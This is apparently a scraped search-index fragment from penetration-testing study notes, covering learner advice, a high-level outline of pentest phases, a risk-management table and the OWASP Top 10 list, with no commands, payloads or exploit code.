Asking good questions is a difficult skill to master, but it's necessary for us in our studies and careers . The difficulty is the dimension of your success that you must decide to step into. Every day is a school day. Try to learn at least one new thing every single day. Closely monitor the ever-evolving threat landscape and try to understand/emulate the techniques, tactics, and procedures of adversaries in the wild. This way you can provide your future clients/employers with realistic engagements. **Keep it simple.** Sometimes challenges can be complex, but the answers might be right in front of you. If you have a hunch, follow it before trying something more advanced. Sophistication breeds excellence; excellence breeds sophistication. The difference between your skill level and the module exercises is the amount you should improve. As you complete the path and review earlier exercises, you'll see that you can easily complete them, indicating your skill level has increased. If you truly want to accomplish what you set your mind to, remain persistent! Keep learning, and know that persistence pays off! Don't be afraid to ask questions. Getting a peer or mentor's perspective on a problem can help you get back on track. Sometimes it just takes another set of eyes. Staying in your comfort zone is easy. Challenging your potential will keep you moving forward. .. client will usually remember interactions during the assessment, communication, and how they were treated/valued by the firm they engage, not the fancy exploit chain the pentester pulled off to pwn their systems .","title":"Words of Wisdom"},{"location":"00%20honeypot/Writeups/f1r57_h4ck/","text":"f1r57_h4ck \u00b6 Try to identify the services running on the server above, and then try to search to find public exploits to exploit them.

Information Gathering \u00b6 Once the pre-engagement activities are complete, we investigate the company's existing website we have been assigned to assess. We identify the technologies in use and learn how the web application functions. Vulnerability Assessment \u00b6 With this information, we can look for known vulnerabilities and investigate questionable features that may allow for unintended actions. Post-Exploitation \u00b6 Once we have successfully exploited the target, we jump into information gathering and examine the webserver from the inside. If we find sensitive information during this stage, we try to escalate our privileges (depending on the system and configurations). Lateral Movement \u00b6 If other servers and hosts in the internal network are in scope, we then try to move through the network and access other hosts and servers using the information we have gathered. Proof-of-Concept \u00b6 We create a proof-of-concept that proves that these vulnerabilities exist and potentially even automate the individual steps that trigger these vulnerabilities.

Risk Managment Process Step Explanation Identifying the Risk Identifying risks the business is exposed to, such as legal, environmental, market, regulatory, and other types of risks. Analyze the Risk Analyzing the risks to determine their impact and probability. The risks should be mapped to the organization's various policies, procedures, and business processes. Evaluate the Risk Evaluating, ranking, and prioritizing risks. Then, the organization must decide to accept (unavoidable), avoid (change plans), control (mitigate), or transfer risk (insure). Dealing with Risk Eliminating or containing the risks as best as possible. This is handled by interfacing directly with the stakeholders for the system or process that the risk is associated with. Monitoring Risk All risks must be constantly monitored. Risks should be constantly monitored for any situational changes that could change their impact score, i.e., from low to medium or high impact . Red Team vs. Blue Team In infosec, we usually hear the terms red team and blue team . In the simplest terms, the red team plays the attackers' role, while the blue team plays the defenders' part.

This is a standardized list of the top 10 web application vulnerabilities maintained by the Open Web Application Security Project (OWASP).This list is considered the top 10 most dangerous vulnerabilities and is not an exhaustive list of all possible web application vulnerabilities. Web application security assessment methodologies are often based around the OWASP top 10 as a starting point for the top categories of flaws that an assessor should be checking for. The current OWASP Top 10 list is: Number Category Description 1. Broken Access Control Restrictions are not appropriately implemented to prevent users from accessing other users accounts, viewing sensitive data, accessing unauthorized functionality, modifying data, etc. 2. Cryptographic Failures Failures related to cryptography which often leads to sensitive data exposure or system compromise. 3. Injection User-supplied data is not validated, filtered, or sanitized by the application. Some examples of injections are SQL injection, command injection, LDAP injection, etc. 4. Insecure Design These issues happen when the application is not designed with security in mind. 5. Security Misconfiguration Missing appropriate security hardening across any part of the application stack, insecure default configurations, open cloud storage, verbose error messages which disclose too much information. 6. Vulnerable and Outdated Components Using components (both client-side and server-side) that are vulnerable, unsupported, or out of date. 7. Identification and Authentication Failures Authentication-related attacks that target user's identity, authentication, and session management. 8. Software and Data Integrity Failures Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs). 9. Security Logging and Monitoring Failures This category is to help detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected.. 10. Server-Side Request Forgery SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).
